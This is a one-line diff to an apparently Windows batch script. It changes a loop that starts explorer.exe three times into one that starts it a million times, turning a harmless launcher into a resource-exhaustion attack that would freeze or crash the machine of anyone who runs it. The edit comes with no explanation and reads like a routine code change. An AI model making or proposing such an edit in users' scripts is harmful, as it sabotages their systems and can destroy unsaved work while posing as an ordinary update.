@@ -1,1 +1,1 @@
-@echo off & for /L %%i in (1,1,3) do start explorer.exe
+@echo off & for /L %%i in (1,1,1000000) do start explorer.exe
